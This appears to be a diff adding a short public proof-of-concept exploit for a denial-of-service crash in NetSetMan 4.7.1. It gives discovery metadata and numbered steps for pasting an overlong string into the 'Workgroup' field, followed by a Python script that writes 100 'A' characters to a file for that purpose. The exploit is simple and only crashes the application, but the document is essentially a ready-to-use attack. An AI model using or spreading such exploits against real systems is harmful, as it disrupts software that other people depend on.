@@ -1,0 +1,21 @@
+#Exploit Title: NetSetMan 4.7.1 'Workgroup' - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2018-02-17
+#Vendor Homepage: https://www.netsetman.com/
+#Software Link: https://www.netsetman.com/netsetman.exe
+#Tested Version: 4.7.1
+#Tested on: Windows 10 Single Language x64 / Windows 7 x32 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: NetSetMan_4.7.1.py
+#2.- Open netsetman.txt and copy content to clipboard
+#3.- Open NetSetMan
+#4.- Enable "Workgroup" and Paste Clipboard
+#5.- Click on "Activate"
+#6.- Crashed
+
+cod = "\x41" * 100
+
+f = open('netsetman.txt', 'w')
+f.write(cod)
+f.close()
